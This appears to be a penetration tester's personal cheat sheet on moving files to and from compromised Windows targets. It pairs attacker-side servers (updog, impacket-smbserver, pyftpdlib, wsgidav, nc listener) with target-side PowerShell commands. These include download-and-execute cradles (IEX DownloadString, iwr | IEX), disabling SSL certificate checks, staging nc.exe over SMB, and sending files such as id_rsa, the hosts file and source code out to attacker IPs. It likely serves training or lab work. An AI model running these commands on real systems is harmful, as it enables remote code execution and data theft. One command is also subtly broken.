- [ ] Upload To Target
PowerShell Base64 Encode & Decode!!!!
```sh
# attacker
cat id_rsa |base64 -w 0;echo
# on the target
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64String"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
PowerShell Web Client!!!
```sh
# attacker
updog -p 80
# on the target
(New-Object Net.WebClient).DownloadFile('<Target File URL>','C:\Users\Public\out.exe')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','C:\Users\Public\out.exe')

IEX (New-Object Net.WebClient).DownloadString('URL')
(New-Object Net.WebClient).DownloadString('URL') | IEX

Invoke-WebRequest URL -OutFile out.ps1
iwr -Uri URL -OutFile out.ps1
iwr URL -UseBasicParsing | IEX

# Bypass SSL Errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
![[Pasted image 20250608082144.png]]
SMB!!!!
```sh
# attacker
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user test -password test

# on the target
copy \\192.168.220.133\share\nc.exe
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```
FTP!!!!
```sh
# attacker
python3 -m pyftpdlib --port 2121

# on the target
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
![[Pasted image 20250608085339.png]]

- [ ] Download From Target
PowerShell Base64 Encode & Decode!!!!
```sh
# on the target
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# attacker
echo base64String  | base64 -d > hosts
```
PowerShell Web!!!
```sh
# on the target
IEX(New-Object Net.WebClient).DownloadString('PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.12:8000/upload -File C:\Windows\System32\drivers\etc\hosts

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
# attacker
python3 -m uploadserver 8080
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```
SMB!!!!
![[Pasted image 20250608090703.png]]
```sh
# on the target
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

# attacker
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
FTP!!!!
```sh
# on the target
New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
# attacker
python3 -m pyftpdlib --port 2121 --write
```
![[Pasted image 20250608091057.png]